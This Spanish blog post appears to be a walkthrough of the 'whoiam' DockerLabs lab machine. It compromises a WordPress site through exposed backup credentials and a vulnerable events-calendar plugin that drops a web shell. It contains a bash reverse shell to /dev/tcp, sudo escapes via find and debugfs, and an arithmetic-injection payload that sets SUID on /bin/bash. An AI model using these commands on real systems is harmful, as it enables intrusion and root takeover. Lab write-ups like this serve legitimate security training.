---
layout: post
title: "whoiam"
date: 2026-02-03 18:30:00 -0300
categories: [Writeups,whoiam]
tags: [DockerLabs, Whoiam, Linux]
description: "Writeup de la máquina whoiam de DockerLabs"
image: /assets/images/dockerlabs.jpeg
---
# whoiam – DockerLabs (Linux – Fácil)

## 📌 Resumen

whoiam es una máquina Linux de dificultad Fácil de la plataforma DockerLabs.

Durante su resolución se explotan los siguientes vectores:

- Enumeración de servicios
- Identificación de CMS vulnerable
- Exposición de backups con credenciales
- Explotación de plugin WordPress
- Escalada horizontal de usuarios
- Escalada vertical hasta root mediante mala configuración de sudo


# 🖥️ Despliegue

Descargamos la máquina desde DockerLabs y la desplegamos:
```bash
sudo bash auto_deploy.sh tproot.tar
```
Verificamos conectividad:

```bash
ping -c 1 172.18.0.2
```
El TTL observado es 64, indicando que se trata de una máquina Linux.


# 🔎 Enumeración

## Escaneo completo de puertos

```bash
nmap -p- --open -T5 -v -n 172.18.0.2
```
Se detecta únicamente el puerto 80 abierto.


## Escaneo detallado

```bash
nmap -sC -sV -p80 172.18.0.2 -oN targeted
```
Resultados relevantes:
- Apache 2.4.58
- Ubuntu Linux


# 🌐 Fingerprinting Web

```bash
whatweb http://172.18.0.2
```
Se identifica:
- Apache 2.4.58
- WordPress 6.5.4
- jQuery 3.7.1


# 📂 Enumeración de Directorios

```bash
gobuster dir -u http://172.18.0.2/ \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,txt,html -t 50
```
Directorios encontrados:

```bash
/backups
/index.php
/license.txt
/readme.html
/server-status
/wp-content
/wp-includes
/wp-config.php
/xmlrpc.php
/wp-trackback.php
/wp-login.php
/wp-admin
```

# 📦 Análisis de Backups

Accedemos a **/backups** y descargamos el archivo expuesto.

Dentro encontramos credenciales:

Username: **developer**
Password: **2wmy3KrGDRD%RsA7Ty5n71L^**

Esto confirma una mala práctica crítica: exposición de copias de seguridad accesibles públicamente.


# 💥 Explotación

Se identifica vulnerabilidad en el plugin modern-events-calendar-lite.

Ejecutamos el exploit con las credenciales obtenidas:

```bash
python3 exploit.py -T 172.18.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^
```
El exploit genera una web shell en:

```bash
http://172.18.0.2/wp-content/uploads/shell.php
```

# 🐚 Reverse Shell

En la máquina atacante:

```bash
nc -lvnp 4444
```
En la web shell:

```bash
bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'
```
Confirmamos acceso:

```bash
whoami
```
Resultado:

```bash
www-data
```

# 🔼 Escalada a rafa

```bash
sudo -l
```
Se observa:

```bash
(www-data) NOPASSWD: /usr/bin/find
```
Explotación:

```bash
sudo -u rafa find . -exec /bin/bash \; -quit
```
Confirmamos:

```bash
whoami
```
Resultado:

```bash
rafa
```

# 🔼 Escalada a ruben

```bash
sudo -l
```
Se observa:

```bash
(rafa) NOPASSWD: /usr/sbin/debugfs
```
Explotación:

```bash
sudo -u ruben debugfs
!/bin/bash
```
Confirmamos:

```bash
whoami
```
Resultado:

```bash
ruben
```

# 🔼 Escalada a root

```bash
sudo -l
```
Se observa:

```bash
(ALL) NOPASSWD: /bin/bash /opt/penguin.sh
```
Revisamos el script:

```bash
#!/bin/bash
read -rp "Enter guess: " num

if [[ $num -eq 42 ]]
then
  echo "Correct"
else
  echo "Wrong"
fi
```
Ejecutamos:

```bash
sudo bash /opt/penguin.sh
```
Bypass del control numérico:

```bash
prueba[$(chmod u+s /bin/bash >&2)]+42
```
Luego ejecutamos:

```bash
/bin/bash -p
```
Confirmamos:

```bash
whoami
```
Resultado:

```bash
root
```

# 🏁 Conclusión

La máquina whoiam demuestra:

- Importancia de una correcta enumeración.
- Riesgos de exponer backups con credenciales.
- Peligro de plugins vulnerables en WordPress.
- Impacto crítico de configuraciones inseguras en sudo.

Es una máquina ideal para principiantes, ya que cubre conceptos fundamentales de pentesting web y escalada de privilegios en Linux.
